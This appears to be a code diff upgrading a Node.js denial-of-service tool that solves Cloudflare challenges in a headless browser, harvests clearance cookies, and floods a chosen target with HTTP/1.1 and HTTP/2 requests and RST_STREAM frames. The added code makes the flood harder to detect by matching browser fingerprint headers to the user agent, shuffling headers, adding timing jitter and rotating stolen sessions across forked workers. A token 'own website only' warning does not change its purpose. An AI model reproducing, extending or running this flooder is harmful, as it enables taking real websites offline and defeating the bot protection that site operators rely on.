@@ -1,5 +1,6 @@
 // ============================================================
-//  CLOUDFLARE SOLVER + RST_STREAM FLOODER (COMBINED)
+//  CLOUDFLARE SOLVER + RST_STREAM FLOODER (COMBINED) v1.1
+//  with realistic fingerprint matching & session rotation
 // ============================================================
 
 const { connect } = require("puppeteer-real-browser");
@@ -19,7 +20,7 @@ const chalk = require('chalk');
 // IGNORE LISTS
 // ============================================================
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
-const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
+const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
@@ -76,7 +77,7 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 
 if (!reqmethod || !target || !time || !threads || !ratelimit) {
     console.clear();
-    console.log(`${chalk.blue('COMBINED SOLVER + RST_STREAM v1.0')}`);
+    console.log(`${chalk.blue('COMBINED SOLVER + RST_STREAM v1.1')}`);
     console.log(chalk.red.underline('How to use & example:'));
     console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <cookieCount> [options]`));
     console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 3 --query 1 --debug\n`);
@@ -93,6 +94,8 @@ if (!reqmethod || !target || !time || !threads || !ratelimit) {
       --randrate - random rate
       --header <header>#<header>
       --http 1/2/mix
+      --precheck <anything> - run precheck
+      --cdn <hostname>
     `));
     process.exit(1);
 }
@@ -103,7 +106,7 @@ if (!target.startsWith('https://')) {
 }
 
 // ============================================================
-// GLOBAL SESSION STORAGE (diisi dari solver)
+// GLOBAL SESSION STORAGE (diisi dari solver / dipilih worker)
 // ============================================================
 let session = {
     userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
@@ -458,27 +461,39 @@ function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-function buildRequest() {
-    const browserVersion = getRandomInt(120, 128);
-    const fwfw = ['Google Chrome', 'Brave'];
-    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
-    let brandValue;
-    if (browserVersion === 120) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 121) brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 122) brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 123) brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 124) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 125) brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 126) brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 127) brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
-    else if (browserVersion === 128) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
+// ============================================================
+// UA PARSER (untuk sec-ch-ua yang match dengan User-Agent asli)
+// ============================================================
+function getUABrand(ua) {
+    const m = ua.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/);
+    if (!m) {
+        return {
+            major: 122,
+            full: "122.0.0.0",
+            brands: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"'
+        };
+    }
+    const major = parseInt(m[1]);
+    const full = `${m[1]}.${m[2]}.${m[3]}.${m[4]}`;
+    let brands;
+    if (major === 120) brands = `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`;
+    else if (major === 121) brands = `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`;
+    else if (major === 122) brands = `"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"`;
+    else if (major === 123) brands = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+    else if (major === 124) brands = `"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"`;
+    else if (major === 125) brands = `"Not A(Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"`;
+    else if (major === 126) brands = `"Chromium";v="126", "Not(A:Brand";v="24", "Google Chrome";v="126"`;
+    else if (major === 127) brands = `"Google Chrome";v="127", "Not:A-Brand";v="8", "Chromium";v="127"`;
+    else if (major >= 128) brands = `"Not_A Brand";v="8", "Chromium";v="${major}", "Google Chrome";v="${major}"`;
+    else brands = `"Chromium";v="${major}", "Not(A:Brand";v="24", "Google Chrome";v="${major}"`;
+    return { major, full, brands };
+}
 
-    const isBrave = wfwf === 'Brave';
-    const acceptHeaderValue = isBrave
-        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
-    const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';
-    const secChUa = `${brandValue}`;
+// ============================================================
+// BUILD HTTP/1.1 REQUEST (untuk ALPN http/1.1)
+// ============================================================
+function buildRequest() {
+    const fp = getUABrand(session.userAgent);
     const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
 
     let mysor = '\r\n';
@@ -487,9 +502,9 @@ function buildRequest() {
     else { mysor = ''; mysor1 = '\r\n'; }
 
     let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
-        `Accept: ${acceptHeaderValue}\r\n` +
-        'Accept-Encoding: gzip, deflate, br\r\n' +
-        `Accept-Language: ${langValue}\r\n` +
+        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n` +
+        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
+        'Accept-Language: en-US,en;q=0.9\r\n' +
         'Cache-Control: max-age=0\r\n' +
         'Connection: Keep-Alive\r\n' +
         `Host: ${url.hostname}\r\n` +
@@ -498,7 +513,8 @@ function buildRequest() {
         'Sec-Fetch-Site: none\r\n' +
         'Sec-Fetch-User: ?1\r\n' +
         'Upgrade-Insecure-Requests: 1\r\n' +
-        `sec-ch-ua: ${secChUa}\r\n` +
+        `User-Agent: ${session.userAgent}\r\n` +
+        `sec-ch-ua: ${fp.brands}\r\n` +
         'sec-ch-ua-mobile: ?0\r\n' +
         'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
 
@@ -508,7 +524,7 @@ function buildRequest() {
     return Buffer.from(`${headers}`, 'binary');
 }
 
-const h1payl = Buffer.concat(new Array(1).fill(buildRequest()));
+let h1payl = null; // build saat worker sudah punya session
 
 function handleQuery(query) {
     if (query === '1') return url.pathname + '?__cf_chl_rt_tk=' + randstrrr(30) + '_' + randstrrr(12) + '-' + timestampString1 + '-0-' + 'gaNy' + randstrrr(8);
@@ -544,6 +560,9 @@ if (shitty) {
 // FLOODER GO()
 // ============================================================
 function go() {
+    // Rebuild h1 payload sesuai session saat ini (biar UA selalu match)
+    h1payl = Buffer.concat(new Array(1).fill(buildRequest()));
+
     let tlsSocket;
 
     tlsSocket = tls.connect({
@@ -564,8 +583,12 @@ function go() {
 
             function mainH1() {
                 tlsSocket.write(h1payl, (err) => {
-                    if (!err) setTimeout(() => mainH1(), isFull ? 1000 : 1000 / ratelimit);
-                    else tlsSocket.end(() => tlsSocket.destroy());
+                    if (!err) {
+                        const jitter = 5 + Math.floor(Math.random() * 25);
+                        setTimeout(() => mainH1(), (isFull ? 1000 : 1000 / ratelimit) + jitter);
+                    } else {
+                        tlsSocket.end(() => tlsSocket.destroy());
+                    }
                 });
             }
             mainH1();
@@ -606,13 +629,22 @@ function go() {
                     data = data.subarray(frame.length + 9);
                     if (frame.type == 4 && frame.flags == 0) tlsSocket.write(encodeFrame(0, 4, "", 1));
                     if (frame.type == 1) {
-                        const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
-                        if (status == 403 || status == 429) {
-                            tlsSocket.write(encodeRstStream(0, 3, 0));
-                            tlsSocket.end(() => tlsSocket.destroy());
+                        let status;
+                        try {
+                            const decoded = hpack.decode(frame.payload);
+                            status = decoded.find(x => x[0] == ':status')?.[1];
+                        } catch (e) {}
+                        if (status) {
+                            if (!statuses[status]) statuses[status] = 0;
+                            statuses[status]++;
+
+                            // 200 OK → biarkan koneksi hidup, main() loop lanjut kirim request
+                            // 403 / 429 → tutup & worker akan buat koneksi baru dengan session berbeda
+                            if (status == 403 || status == 429) {
+                                tlsSocket.write(encodeRstStream(0, 3, 0));
+                                tlsSocket.end(() => tlsSocket.destroy());
+                            }
                         }
-                        if (!statuses[status]) statuses[status] = 0;
-                        statuses[status]++;
                     }
                     if (frame.type == 7 || frame.type == 5) {
                         if (frame.type == 7 && debugMode) {
@@ -646,30 +678,13 @@ function go() {
             if (randrate !== undefined) ratelimitLocal = getRandomInt(1, 64);
             else ratelimitLocal = process.argv[6];
 
+            // Fingerprint UA asli (match dengan session userAgent)
+            const fp = getUABrand(session.userAgent);
+
+            // Bangun list brand versi full untuk sec-ch-ua-full-version-list
+            const fullVersionList = fp.brands.replace(/v="(\d+)"/g, (_, v) => `v="${v}.0.0.0"`);
+
             for (let i = 0; i < (isFull ? ratelimitLocal : 1); i++) {
-                const browserVersion = getRandomInt(120, 128);
-                const fwfw = ['Google Chrome', 'Brave'];
-                const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
-                const ref = ["same-site", "same-origin", "cross-site"];
-                const ref1 = ref[Math.floor(Math.random() * ref.length)];
-
-                let brandValue;
-                if (browserVersion === 120) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 121) brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 122) brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 123) brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 124) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 125) brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 126) brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 127) brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
-                else if (browserVersion === 128) brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
-
-                const isBrave = wfwf === 'Brave';
-                const acceptHeaderValue = isBrave
-                    ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
-                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
-                const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
-                const secChUa = `${brandValue}`;
 
                 if (cdn1) {
                     const requestHeaders = {
@@ -680,7 +695,7 @@ function go() {
                         'Connection': 'keep-alive',
                         "upgrade-insecure-requests": "1",
                         'Cache-Control': 'no-cache',
-                        'sec-ch-ua': secChUa,
+                        'sec-ch-ua': fp.brands,
                         "accept-encoding": "gzip, deflate, br",
                         'Pragma': "no-cache",
                     };
@@ -701,9 +716,9 @@ function go() {
                         const itb = 1000 / ratelimit;
                         while (performance.now() < endTime) {
                             const requests33 = [];
-                            for (let i = 0; i < threads; i++) {
+                            for (let j = 0; j < threads; j++) {
                                 requests33.push(new Promise(resolve => {
-                                    setTimeout(() => { performRequest(); resolve(); }, itb * i);
+                                    setTimeout(() => { performRequest(); resolve(); }, itb * j);
                                 }));
                             }
                             await Promise.all(requests33);
@@ -713,42 +728,56 @@ function go() {
                     startFlood();
                 }
 
-                let randomNum = Math.floor(Math.random() * (1000000 - 100000 + 1) + 100000);
-                const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
+                // ---- Pseudo-headers WAJIB di depan & urut ----
+                const pseudoHeaders = [
+                    [":method", reqmethod],
+                    [":authority", url.hostname],
+                    [":scheme", "https"],
+                    [":path", query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : "")],
+                ];
 
-                const headers = Object.entries({
-                    ":method": reqmethod,
-                    ":authority": url.hostname,
-                    ":scheme": "https",
-                    ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                }).concat(Object.entries({
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": '"Windows"',
-                    "sec-ch-ua-platform-version": "10.0.0",
-                    "accept-encoding": "gzip, deflate, br",
-                    "accept-language": "en-US,en;q=0.9",
-                    "sec-fetch-site": "same-origin",
-                    "sec-fetch-mode": "navigate",
-                    "sec-fetch-user": "?1",
-                    "sec-fetch-dest": "document",
-                    "upgrade-insecure-requests": "1",
-                    "pragma": "no-cache",
-                    "user-agent": `${session.userAgent}`,
-                    ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
-                }).filter(a => a[1] != null));
+                // ---- Browser headers realistis (match dengan UA asli) ----
+                const browserHeaders = [
+                    ["sec-ch-ua", fp.brands],
+                    ["sec-ch-ua-mobile", "?0"],
+                    ["sec-ch-ua-platform", '"Windows"'],
+                    ["sec-ch-ua-platform-version", "10.0.0"],
+                    ["sec-ch-ua-arch", '"x86"'],
+                    ["sec-ch-ua-bitness", '"64"'],
+                    ["sec-ch-ua-model", '""'],
+                    ["sec-ch-ua-full-version", `"${fp.full}"`],
+                    ["sec-ch-ua-full-version-list", fullVersionList],
+                    ["upgrade-insecure-requests", "1"],
+                    ["user-agent", session.userAgent],
+                    ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
+                    ["sec-fetch-site", "none"],
+                    ["sec-fetch-mode", "navigate"],
+                    ["sec-fetch-user", "?1"],
+                    ["sec-fetch-dest", "document"],
+                    ["accept-encoding", "gzip, deflate, br, zstd"],
+                    ["accept-language", "en-US,en;q=0.9"],
+                    ["priority", "u=0, i"],
+                ];
 
-                const headers2 = Object.entries({}).filter(a => a[1] != null);
-
-                const headers3 = Object.entries({
-                    "cookie": `${cookieString}`,
-                }).filter(([_, v]) => v != null);
-
-                for (let i = headers2.length - 1; i > 0; i--) {
-                    const j = Math.floor(Math.random() * (i + 1));
-                    [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
+                // Shuffle hanya browser headers (bukan pseudo)
+                for (let j = browserHeaders.length - 1; j > 0; j--) {
+                    const k = Math.floor(Math.random() * (j + 1));
+                    [browserHeaders[j], browserHeaders[k]] = [browserHeaders[k], browserHeaders[j]];
                 }
 
-                const combinedHeaders = headers.concat(headers2).concat(headers3);
+                // Cookie dari solver (cf_clearance asli)
+                const cookieHeader = cookieString ? [["cookie", cookieString]] : [];
+
+                // Custom headers user
+                const customArr = customHeadersArray.map(h => Object.entries(h)[0]);
+
+                // Gabung: pseudo → browser → cookie → custom (pseudo tetap di depan)
+                const combinedHeaders = [
+                    ...pseudoHeaders,
+                    ...browserHeaders,
+                    ...cookieHeader,
+                    ...customArr
+                ].filter(([_, v]) => v != null && v !== "");
 
                 if (limit) {
                     async function makeRequest(u) {
@@ -764,7 +793,7 @@ function go() {
                             }
                         }
                     }
-                    makeRequest(url);
+                    makeRequest(url).catch(() => {});
                 }
 
                 const packed = Buffer.concat([
@@ -785,7 +814,10 @@ function go() {
             }
 
             tlsSocket.write(Buffer.concat(requests), (err) => {
-                setTimeout(() => main(), 1000 / ratelimit);
+                if (err) { tlsSocket.destroy(); return; }
+                // Jitter 5-30ms supaya pola tidak konstan
+                const jitter = 5 + Math.floor(Math.random() * 25);
+                setTimeout(() => main(), (1000 / ratelimit) + jitter);
             });
         }
         main();
@@ -828,27 +860,35 @@ setInterval(() => {
 (async () => {
     if (cluster.isMaster) {
         console.clear();
-        console.log("\x1b[35mCOMBINED SOLVER + RST_STREAM FLOODER\x1b[0m");
+        console.log("\x1b[35mCOMBINED SOLVER + RST_STREAM FLOODER v1.1\x1b[0m");
         console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
 
         // 1) Run solver di master
         const sessions = await bypassCloudflareParallel(cookieCount);
         sessions.forEach((s, i) => printSessionDetails(s, i));
 
-        // 2) Ambil session pertama (bisa di-random kalau mau)
-        const chosen = sessions[0];
-        session = { userAgent: chosen.userAgent };
-        cookieString = chosen.cookies.map(c => `${c.name}=${c.value}`).join("; ");
+        // 2) Simpan semua session ke file temp supaya worker bisa rotate
+        const sessionFile = `./.sessions_${Date.now()}.json`;
+        const sessionsForWorkers = sessions.map(s => ({
+            userAgent: s.userAgent,
+            cookies: s.cookies,
+            cookieString: s.cookies.map(c => `${c.name}=${c.value}`).join("; "),
+            cfClearance: s.cfClearance,
+            headers: s.headers
+        }));
+        fs.writeFileSync(sessionFile, JSON.stringify(sessionsForWorkers));
+        process.env.SESSION_FILE = sessionFile;
+        process.env.SESSION_COUNT = String(sessions.length);
 
-        console.log(`\n\x1b[32mUsing session from attempt #${chosen.attemptNum}\x1b[0m`);
-        console.log(`\x1b[36mUA:\x1b[0m ${session.userAgent}`);
-        console.log(`\x1b[36mCookie:\x1b[0m ${cookieString.substring(0, 120)}...\n`);
+        console.log(`\n\x1b[32mSaved ${sessionsForWorkers.length} session(s) to ${sessionFile}\x1b[0m`);
+        console.log(`\x1b[36mSample UA:\x1b[0m ${sessionsForWorkers[0].userAgent}`);
+        console.log(`\x1b[36mSample Cookie:\x1b[0m ${sessionsForWorkers[0].cookieString.substring(0, 120)}...\n`);
 
-        // 3) Fork workers dengan env berisi session
+        // 3) Fork workers dengan env berisi session file
         for (let i = 0; i < threads; i++) {
             cluster.fork({
-                SESSION_UA: session.userAgent,
-                SESSION_COOKIE: cookieString,
+                SESSION_FILE: sessionFile,
+                SESSION_COUNT: String(sessions.length),
                 core: i % os.cpus().length
             });
         }
@@ -857,8 +897,8 @@ setInterval(() => {
         const workers = {};
         cluster.on('exit', (worker) => {
             cluster.fork({
-                SESSION_UA: session.userAgent,
-                SESSION_COOKIE: cookieString,
+                SESSION_FILE: process.env.SESSION_FILE,
+                SESSION_COUNT: process.env.SESSION_COUNT,
                 core: worker.id % os.cpus().length
             });
         });
@@ -885,26 +925,50 @@ setInterval(() => {
         }
 
         setInterval(TCP_CHANGES_SERVER, 5000);
-        setTimeout(() => process.exit(1), time * 1000);
+
+        setTimeout(() => {
+            try { fs.unlinkSync(process.env.SESSION_FILE); } catch (e) {}
+            process.exit(1);
+        }, time * 1000);
 
     } else {
-        // Worker: baca session dari env
-        session = { userAgent: process.env.SESSION_UA || session.userAgent };
-        cookieString = process.env.SESSION_COOKIE || "";
+        // === Worker: load semua session dari file ===
+        let ALL_SESSIONS = [];
+        try {
+            const raw = fs.readFileSync(process.env.SESSION_FILE, 'utf8');
+            ALL_SESSIONS = JSON.parse(raw);
+            if (!Array.isArray(ALL_SESSIONS) || ALL_SESSIONS.length === 0) throw new Error("empty");
+        } catch (e) {
+            ALL_SESSIONS = [{
+                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+                cookieString: ""
+            }];
+        }
+
+        // Pick session acak
+        function pickSession() {
+            const s = ALL_SESSIONS[Math.floor(Math.random() * ALL_SESSIONS.length)];
+            session = { userAgent: s.userAgent || session.userAgent };
+            cookieString = s.cookieString || "";
+            return s;
+        }
+        pickSession();
 
         let consssas = 0;
         let someee = setInterval(() => {
             if (consssas < 30000) consssas++;
             else { clearInterval(someee); return; }
-            go();
-        }, delay);
+            // Rotasi session tiap koneksi baru
+            pickSession();
+            try { go(); } catch (e) {}
+        }, delay > 0 ? delay : 5);
 
         if (debugMode) {
             setInterval(() => {
                 if (statusesQ.length >= 4) statusesQ.shift();
                 statusesQ.push(statuses);
                 statuses = {};
-                process.send(statusesQ);
+                try { process.send(statusesQ); } catch (e) {}
             }, 250);
         }
 
